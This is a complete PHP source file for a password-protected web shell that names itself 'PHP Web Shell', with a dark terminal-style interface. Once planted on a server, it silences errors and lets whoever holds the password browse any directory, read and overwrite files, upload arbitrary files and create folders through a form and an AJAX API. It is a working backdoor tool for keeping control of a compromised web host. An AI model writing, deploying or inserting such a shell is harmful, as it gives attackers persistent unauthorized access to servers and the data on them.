<?php
// Silence all errors
@ini_set('display_errors', 0);
@set_time_limit(0);
@error_reporting(0);

// --- CONFIGURATION ---
// The password to access the webshell. Change this to your desired password.
 

$password_hash = "ca73aef99678bde39edc62231dde2059";

// --- AUTHENTICATION ---
session_start();

// Logout logic
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . basename(__FILE__));
    exit();
}

// Login logic
if (isset($_POST['password'])) {
    if (md5($_POST['password']) === $password_hash) {
        $_SESSION['loggedin'] = true;
        header("Location: " . basename(__FILE__));
        exit();
    } else {
        $login_error = "Invalid Password!";
    }
}

// If not logged in, show the login page
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Required</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
        :root {
            --background: #1a1b26;
            --foreground: #c0caf5;
            --primary: #bb9af7;
            --secondary: #7aa2f7;
            --error: #f7768e;
            --success: #9ece6a;
            --border: #414868;
        }
        body {
            background-color: var(--background);
            color: var(--foreground);
            font-family: 'Fira Code', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #24283b;
            padding: 40px;
            border-radius: 10px;
            border: 1px solid var(--border);
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            width: 100%;
            max-width: 350px;
            text-align: center;
        }
        .login-container h1 {
            color: var(--primary);
            margin-bottom: 10px;
            font-size: 1.8em;
        }
        .login-container p {
            margin-bottom: 30px;
            font-size: 0.9em;
            color: #a9b1d6;
        }
        .login-container input[type="password"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            background-color: var(--background);
            border: 1px solid var(--border);
            border-radius: 5px;
            color: var(--foreground);
            font-family: 'Fira Code', monospace;
            box-sizing: border-box;
        }
        .login-container input[type="submit"] {
            width: 100%;
            padding: 12px;
            background-color: var(--primary);
            border: none;
            border-radius: 5px;
            color: var(--background);
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .login-container input[type="submit"]:hover {
            background-color: #9d7cd8;
        }
        .error-message {
            color: var(--error);
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>[ Access Denied ]</h1>
        <p>Authentication Required</p>
        <form method="POST" action="">
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Login">
        </form>
        <?php if (isset($login_error)) { echo "<p class='error-message'>{$login_error}</p>"; } ?>
    </div>
</body>
</html>
<?php
    exit(); // Stop execution if not logged in
}

// --- BACKEND LOGIC (UNCHANGED) ---
function safe($s) {
    return htmlspecialchars($s, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

function formatSize($bytes) {
    if ($bytes === false) return 'N/A';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    for ($i = 0; $bytes >= 1024 && $i < count($units) - 1; $i++) {
        $bytes /= 1024;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

$cwd = isset($_GET['path']) ? $_GET['path'] : getcwd();
$cwd = realpath($cwd);
if ($cwd === false) {
    $cwd = getcwd(); // Fallback to current script directory
}

$message = '';
$message_type = '';

// Handle upload
if (isset($_POST['upload']) && isset($_FILES['file'])) {
    $target = $cwd . '/' . basename($_FILES['file']['name']);
    if (@move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        $message = 'File uploaded successfully.';
        $message_type = 'success';
    } else {
        $message = 'Upload failed. Check permissions.';
        $message_type = 'error';
    }
}

// Handle file edit save
if (isset($_POST['save']) && isset($_POST['filename']) && isset($_POST['content'])) {
    $path = realpath($cwd . '/' . basename($_POST['filename']));
    // Ensure we are not traversing directories
    if ($path && strpos($path, $cwd) === 0) {
        if (@file_put_contents($path, $_POST['content']) !== false) {
            $message = 'File saved successfully.';
            $message_type = 'success';
        } else {
            $message = 'Failed to save file. Check permissions.';
            $message_type = 'error';
        }
    } else {
        $message = 'Invalid file path for saving.';
        $message_type = 'error';
    }
}

// Handle create directory
if (isset($_POST['mkdir']) && isset($_POST['dirname'])) {
    $dirName = basename($_POST['dirname']);
    if (!empty($dirName)) {
        $fullPath = $cwd . '/' . $dirName;
        if (!file_exists($fullPath)) {
            if (@mkdir($fullPath, 0755)) {
                $message = 'Directory created successfully.';
                $message_type = 'success';
            } else {
                $message = 'Failed to create directory. Check permissions.';
                $message_type = 'error';
            }
        } else {
            $message = 'Directory already exists.';
            $message_type = 'warning';
        }
    } else {
        $message = 'Directory name cannot be empty.';
        $message_type = 'error';
    }
}


// --- AJAX API ---
if (isset($_GET['ajax'])) {
    header('Content-Type: application/json; charset=utf-8');

    $ajax = $_GET['ajax'];

    if ($ajax === 'list') {
        $items = [];
        $files = @scandir($cwd);

        if ($files === false) {
            echo json_encode(['ok' => false, 'message' => 'Could not read directory.']);
            exit;
        }

        foreach ($files as $f) {
            if ($f === '.' || $f === '..') continue;

            $fp = $cwd . '/' . $f;
            $isDir = is_dir($fp);

            $items[] = [
                'name' => $f,
                'type' => $isDir ? 'dir' : 'file',
                'size' => $isDir ? 'DIR' : formatSize(@filesize($fp)),
                'permissions' => substr(sprintf('%o', @fileperms($fp)), -4),
                'path' => $fp
            ];
        }

        usort($items, function($a, $b) {
            if ($a['type'] !== $b['type']) return $a['type'] === 'dir' ? -1 : 1;
            return strcasecmp($a['name'], $b['name']);
        });

        echo json_encode(['ok' => true, 'cwd' => $cwd, 'items' => $items]);
        exit;
    }

    if ($ajax === 'read' && isset($_GET['file'])) {
        $file = basename($_GET['file']);
        $full_path = realpath($cwd . '/' . $file);

        if ($full_path && strpos($full_path, $cwd) === 0 && is_file($full_path)) {
            $content = @file_get_contents($full_path);
            echo json_encode([
                'ok' => true,
                'name' => $file,
                'content' => $content === false ? '' : $content
            ]);
        } else {
            echo json_encode(['ok' => false, 'message' => 'File not found.']);
        }
        exit;
    }

    if ($ajax === 'save') {
        $file = isset($_POST['filename']) ? basename($_POST['filename']) : '';
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        $full_path = realpath($cwd . '/' . $file);

        if ($full_path && strpos($full_path, $cwd) === 0 && is_file($full_path)) {
            if (@file_put_contents($full_path, $content) !== false) {
                echo json_encode(['ok' => true, 'message' => 'File saved successfully.']);
            } else {
                echo json_encode(['ok' => false, 'message' => 'Failed to save file. Check permissions.']);
            }
        } else {
            echo json_encode(['ok' => false, 'message' => 'Invalid file path.']);
        }
        exit;
    }

    if ($ajax === 'mkdir') {
        $dirname = isset($_POST['dirname']) ? basename($_POST['dirname']) : '';

        if ($dirname === '') {
            echo json_encode(['ok' => false, 'message' => 'Directory name cannot be empty.']);
            exit;
        }

        $fullPath = $cwd . '/' . $dirname;

        if (file_exists($fullPath)) {
            echo json_encode(['ok' => false, 'message' => 'Directory already exists.']);
        } elseif (@mkdir($fullPath, 0755)) {
            echo json_encode(['ok' => true, 'message' => 'Directory created successfully.']);
        } else {
            echo json_encode(['ok' => false, 'message' => 'Failed to create directory. Check permissions.']);
        }
        exit;
    }

    if ($ajax === 'upload' && isset($_FILES['file'])) {
        $target = $cwd . '/' . basename($_FILES['file']['name']);

        if (@move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            echo json_encode(['ok' => true, 'message' => 'File uploaded successfully.']);
        } else {
            echo json_encode(['ok' => false, 'message' => 'Upload failed. Check permissions.']);
        }
        exit;
    }

    echo json_encode(['ok' => false, 'message' => 'Unknown AJAX action.']);
    exit;
}

// --- NEW UI RENDERING ---
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terminal :: File Manager</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
        :root {
            --background: #1a1b26;
            --foreground: #c0caf5;
            --primary: #bb9af7;
            --secondary: #7aa2f7;
            --error: #f7768e;
            --success: #9ece6a;
            --warning: #e0af68;
            --border: #414868;
            --panel: #24283b;
            --hover: #2e344e;
        }
        body {
            background-color: var(--background);
            color: var(--foreground);
            font-family: 'Fira Code', monospace;
            margin: 0;
            display: flex;
            height: 100vh;
            overflow: hidden;
        }
        a {
            color: var(--secondary);
            text-decoration: none;
        }
        a:hover {
            color: var(--primary);
            text-decoration: underline;
        }
        .sidebar {
            width: 250px;
            background-color: var(--panel);
            border-right: 1px solid var(--border);
            padding: 20px;
            display: flex;
            flex-direction: column;
            flex-shrink: 0;
        }
        .sidebar h1 {
            color: var(--primary);
            font-size: 1.5em;
            margin: 0 0 10px 0;
            text-align: center;
        }
        .sidebar .logo-sub {
            font-size: 0.8em;
            color: #a9b1d6;
            text-align: center;
            margin-bottom: 30px;
        }
        .sidebar .menu a {
            display: flex;
            align-items: center;
            padding: 12px;
            margin-bottom: 10px;
            border-radius: 5px;
            color: var(--foreground);
            transition: background-color 0.2s ease;
        }
        .sidebar .menu a:hover, .sidebar .menu a.active {
            background-color: var(--hover);
            color: var(--primary);
        }
        .sidebar .menu a svg {
            margin-right: 10px;
            width: 20px;
            height: 20px;
        }
        .sidebar .logout {
            margin-top: auto;
        }
        .main-content {
            flex-grow: 1;
            padding: 20px;
            overflow-y: auto;
        }
        .path-bar {
            background-color: var(--panel);
            padding: 10px 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            word-break: break-all;
        }
        .path-bar a {
            color: var(--secondary);
        }
        .path-bar .prompt {
            color: var(--primary);
            font-weight: bold;
        }
        .file-browser table {
            width: 100%;
            border-collapse: collapse;
        }
        .file-browser th, .file-browser td {
            padding: 10px 15px;
            text-align: left;
            border-bottom: 1px solid var(--border);
        }
        .file-browser th {
            color: #a9b1d6;
            font-size: 0.9em;
            text-transform: uppercase;
        }
        .file-browser td .icon {
            margin-right: 15px;
            vertical-align: middle;
        }
        .file-browser .dir-link {
            font-weight: bold;
        }
        .message-box {
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            color: var(--background);
        }
        .message-box.success { background-color: var(--success); }
        .message-box.error { background-color: var(--error); }
        .message-box.warning { background-color: var(--warning); }
        
        .action-form {
            background-color: var(--panel);
            padding: 20px;
            border-radius: 5px;
            border: 1px solid var(--border);
        }
        .action-form h2 {
            margin-top: 0;
            color: var(--primary);
        }
        .action-form input[type="text"], .action-form input[type="file"], .action-form textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            background-color: var(--background);
            border: 1px solid var(--border);
            border-radius: 5px;
            color: var(--foreground);
            font-family: 'Fira Code', monospace;
            box-sizing: border-box;
        }
        .action-form textarea {
            min-height: 300px;
            resize: vertical;
        }
        .action-form input[type="submit"] {
            padding: 10px 20px;
            background-color: var(--primary);
            border: none;
            border-radius: 5px;
            color: var(--background);
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .action-form input[type="submit"]:hover {
            background-color: #9d7cd8;
        }


        .toolbar {
            display: flex;
            gap: 8px;
            align-items: center;
            flex-wrap: wrap;
            margin-bottom: 15px;
        }

        .tool-btn, .inline-btn {
            background: var(--panel);
            color: var(--foreground);
            border: 1px solid var(--border);
            border-radius: 5px;
            padding: 9px 13px;
            font-family: 'Fira Code', monospace;
            cursor: pointer;
        }

        .tool-btn:hover, .inline-btn:hover {
            background: var(--hover);
            color: var(--primary);
        }

        .primary-btn {
            background: var(--primary);
            color: var(--background);
            border-color: var(--primary);
            font-weight: bold;
        }

        .primary-btn:hover {
            background: #9d7cd8;
            color: var(--background);
        }

        .status {
            margin-left: auto;
            font-size: 0.85em;
        }

        .status.success { color: var(--success); }
        .status.error { color: var(--error); }

        .dynamic-panel {
            margin-top: 5px;
        }

        .panel-head {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 15px;
            margin-bottom: 15px;
        }

        .panel-head h2 {
            margin: 0;
        }

        #editor-content {
            width: 100%;
            min-height: calc(100vh - 250px);
            resize: vertical;
            box-sizing: border-box;
            white-space: pre;
            overflow: auto;
        }

        .editor-actions {
            margin-top: 10px;
        }

        .progress {
            margin-top: 10px;
            color: var(--secondary);
        }

        @media (max-width: 768px) {
            body {
                flex-direction: column;
            }
            .sidebar {
                width: 100%;
                height: auto;
                border-right: none;
                border-bottom: 1px solid var(--border);
                flex-direction: row;
                align-items: center;
                padding: 10px;
                overflow-x: auto;
            }
            .sidebar h1, .sidebar .logo-sub {
                display: none;
            }
            .sidebar .menu {
                display: flex;
                flex-direction: row;
            }
            .sidebar .menu a {
                margin-bottom: 0;
                margin-right: 5px;
            }
            .sidebar .menu a span {
                display: none; /* Hide text on mobile menu */
            }
            .sidebar .logout {
                margin-top: 0;
                margin-left: auto;
            }
            .main-content {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <h1>Terminal</h1>
        <p class="logo-sub">PHP Web Shell</p>
        <div class="menu">
            <a href="?path=<?php echo urlencode($cwd); ?>" class="<?php echo !isset($_GET['action']) ? 'active' : '' ?>">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 20h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.93a2 2 0 0 1-1.66-.9l-.82-1.2A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13c0 1.1.9 2 2 2Z"></path></svg>
                <span>File Browser</span>
            </a>
            <a href="?path=<?php echo urlencode($cwd); ?>&action=upload" class="<?php echo (isset($_GET['action']) && $_GET['action'] == 'upload') ? 'active' : '' ?>">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" x2="12" y1="3" y2="15"></line></svg>
                <span>Upload File</span>
            </a>
            <a href="?path=<?php echo urlencode($cwd); ?>&action=mkdir" class="<?php echo (isset($_GET['action']) && $_GET['action'] == 'mkdir') ? 'active' : '' ?>">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 4h4l3 3h7a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2Z"></path><line x1="12" x2="12" y1="11" y2="17"></line><line x1="9" x2="15" y1="14" y2="14"></line></svg>
                <span>New Directory</span>
            </a>
        </div>
        <a href="?logout=true" class="menu logout">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" x2="9" y1="12" y2="12"></line></svg>
            <span>Logout</span>
        </a>
    </div>

    <div class="main-content">
        <div class="path-bar">
            <span class="prompt">root@server:</span><?php
                $parts = explode(DIRECTORY_SEPARATOR, $cwd);
                $path_so_far = '';
                foreach ($parts as $i => $part) {
                    if (empty($part) && $i === 0) {
                        $path_so_far = DIRECTORY_SEPARATOR;
                        echo "<a href='?path=".urlencode($path_so_far)."'>/</a>";
                        continue;
                    }
                    if(empty($part)) continue;
                    $path_so_far .= $part . DIRECTORY_SEPARATOR;
                    echo "<a href='?path=".urlencode($path_so_far)."'>".safe($part)."</a>/";
                }
            ?>$
        </div>

        <?php if ($message): ?>
            <div class="message-box <?php echo $message_type; ?>"><?php echo safe($message); ?></div>
        <?php endif; ?>

        <div id="app">
            <div class="toolbar">
                <button class="tool-btn" onclick="goHome()">⌂ Browser</button>
                <button class="tool-btn" onclick="openUpload()">↑ Upload</button>
                <button class="tool-btn" onclick="openMkdir()">＋ Folder</button>
                <button class="tool-btn" onclick="refreshFiles()">↻ Refresh</button>
                <span id="status" class="status"></span>
            </div>

            <div id="browser" class="file-browser">
                <table>
                    <thead>
                        <tr>
                            <th>Name</th>
                            <th>Size</th>
                            <th>Permissions</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="file-list"></tbody>
                </table>
            </div>

            <div id="editor" class="action-form dynamic-panel" style="display:none;">
                <div class="panel-head">
                    <h2 id="editor-title">Editing</h2>
                    <button class="tool-btn" onclick="closeEditor()">← Back</button>
                </div>
                <textarea id="editor-content" spellcheck="false"></textarea>
                <div class="editor-actions">
                    <button class="tool-btn primary-btn" onclick="saveEditor()">Save Changes</button>
                </div>
            </div>

            <div id="upload-panel" class="action-form dynamic-panel" style="display:none;">
                <div class="panel-head">
                    <h2>Upload File</h2>
                    <button class="tool-btn" onclick="closePanels()">← Back</button>
                </div>
                <input type="file" id="upload-file">
                <button class="tool-btn primary-btn" onclick="uploadFile()">Upload</button>
                <div id="upload-progress" class="progress"></div>
            </div>

            <div id="mkdir-panel" class="action-form dynamic-panel" style="display:none;">
                <div class="panel-head">
                    <h2>Create Directory</h2>
                    <button class="tool-btn" onclick="closePanels()">← Back</button>
                </div>
                <input type="text" id="dirname" placeholder="New directory name">
                <button class="tool-btn primary-btn" onclick="createDirectory()">Create</button>
            </div>
        </div>
    </div>

<script>
const basePath = <?php echo json_encode($cwd); ?>;
let currentPath = basePath;
let currentFile = '';

const fileList = document.getElementById('file-list');
const statusBox = document.getElementById('status');
const pathBar = document.querySelector('.path-bar');

function esc(value) {
    return String(value).replace(/[&<>"']/g, c => ({
        '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":'&#039;'
    }[c]));
}

function apiUrl(action, path = currentPath) {
    return '?ajax=' + encodeURIComponent(action) + '&path=' + encodeURIComponent(path);
}

function showStatus(message, type = 'success') {
    statusBox.textContent = message;
    statusBox.className = 'status ' + type;
    clearTimeout(showStatus.timer);
    showStatus.timer = setTimeout(() => {
        statusBox.textContent = '';
        statusBox.className = 'status';
    }, 3000);
}

function updatePathBar() {
    let parts = currentPath.split('/').filter(Boolean);
    let html = '<span class="prompt">root@server:</span>';
    let accumulated = currentPath.startsWith('/') ? '/' : '';

    html += '<a href="#" onclick="navigateTo(' + JSON.stringify('/') + ');return false;">/</a>';

    for (const part of parts) {
        if (accumulated === '/') accumulated += part;
        else accumulated += '/' + part;

        const p = accumulated;
        html += '<a href="#" onclick="navigateTo(' + JSON.stringify(p) + ');return false;">' +
                esc(part) + '</a>/';
    }

    html += '$';
    pathBar.innerHTML = html;
}

async function refreshFiles() {
    closePanels();
    try {
        const response = await fetch(apiUrl('list'));
        const data = await response.json();

        if (!data.ok) throw new Error(data.message);

        currentPath = data.cwd;
        updatePathBar();
        renderFiles(data.items);
    } catch (e) {
        showStatus(e.message || 'Failed to load directory.', 'error');
    }
}

function renderFiles(items) {
    let html = '';

    if (currentPath !== '/') {
        const parent = currentPath.substring(0, currentPath.lastIndexOf('/')) || '/';
        html += '<tr><td colspan="4"><a href="#" class="dir-link" onclick="navigateTo(' +
            JSON.stringify(parent) + ');return false;">↩ ..</a></td></tr>';
    }

    for (const item of items) {
        const icon = item.type === 'dir' ? '📁' : '📄';

        if (item.type === 'dir') {
            html += '<tr>' +
                '<td>' + icon + ' <a href="#" class="dir-link" onclick="navigateTo(' +
                JSON.stringify(item.path) + ');return false;">' + esc(item.name) + '</a></td>' +
                '<td>DIR</td>' +
                '<td>' + esc(item.permissions) + '</td>' +
                '<td></td></tr>';
        } else {
            html += '<tr>' +
                '<td>' + icon + ' <a href="#" onclick="openEditor(' +
                JSON.stringify(item.name) + ');return false;">' + esc(item.name) + '</a></td>' +
                '<td>' + esc(item.size) + '</td>' +
                '<td>' + esc(item.permissions) + '</td>' +
                '<td><button class="inline-btn" onclick="openEditor(' +
                JSON.stringify(item.name) + ')">Edit</button></td></tr>';
        }
    }

    fileList.innerHTML = html || '<tr><td colspan="4" style="text-align:center">Directory is empty.</td></tr>';
}

async function navigateTo(path) {
    currentPath = path;
    await refreshFiles();
}

function goHome() {
    refreshFiles();
}

function closePanels() {
    document.getElementById('browser').style.display = '';
    document.getElementById('editor').style.display = 'none';
    document.getElementById('upload-panel').style.display = 'none';
    document.getElementById('mkdir-panel').style.display = 'none';
}

async function openEditor(file) {
    closePanels();
    currentFile = file;
    document.getElementById('browser').style.display = 'none';
    document.getElementById('editor').style.display = '';
    document.getElementById('editor-title').textContent = 'Editing: ' + file;
    document.getElementById('editor-content').value = 'Loading...';

    try {
        const response = await fetch(apiUrl('read') + '&file=' + encodeURIComponent(file));
        const data = await response.json();

        if (!data.ok) throw new Error(data.message);

        document.getElementById('editor-content').value = data.content;
    } catch (e) {
        showStatus(e.message || 'Failed to read file.', 'error');
        closeEditor();
    }
}

function closeEditor() {
    closePanels();
}

async function saveEditor() {
    const form = new FormData();
    form.append('filename', currentFile);
    form.append('content', document.getElementById('editor-content').value);

    try {
        const response = await fetch(apiUrl('save'), {
            method: 'POST',
            body: form
        });
        const data = await response.json();

        if (!data.ok) throw new Error(data.message);

        showStatus(data.message, 'success');
    } catch (e) {
        showStatus(e.message || 'Save failed.', 'error');
    }
}

function openUpload() {
    closePanels();
    document.getElementById('browser').style.display = 'none';
    document.getElementById('upload-panel').style.display = '';
}

async function uploadFile() {
    const input = document.getElementById('upload-file');

    if (!input.files.length) {
        showStatus('Select a file first.', 'error');
        return;
    }

    const form = new FormData();
    form.append('file', input.files[0]);

    const progress = document.getElementById('upload-progress');
    progress.textContent = 'Uploading...';

    try {
        const response = await fetch(apiUrl('upload'), {
            method: 'POST',
            body: form
        });
        const data = await response.json();

        if (!data.ok) throw new Error(data.message);

        input.value = '';
        progress.textContent = '';
        showStatus(data.message, 'success');
        await refreshFiles();
    } catch (e) {
        progress.textContent = '';
        showStatus(e.message || 'Upload failed.', 'error');
    }
}

function openMkdir() {
    closePanels();
    document.getElementById('browser').style.display = 'none';
    document.getElementById('mkdir-panel').style.display = '';
    document.getElementById('dirname').focus();
}

async function createDirectory() {
    const name = document.getElementById('dirname').value.trim();

    if (!name) {
        showStatus('Directory name cannot be empty.', 'error');
        return;
    }

    const form = new FormData();
    form.append('dirname', name);

    try {
        const response = await fetch(apiUrl('mkdir'), {
            method: 'POST',
            body: form
        });
        const data = await response.json();

        if (!data.ok) throw new Error(data.message);

        document.getElementById('dirname').value = '';
        showStatus(data.message, 'success');
        await refreshFiles();
    } catch (e) {
        showStatus(e.message || 'Failed to create directory.', 'error');
    }
}

document.getElementById('dirname').addEventListener('keydown', e => {
    if (e.key === 'Enter') createDirectory();
});

refreshFiles();
</script>
    </div>
</body>
</html>
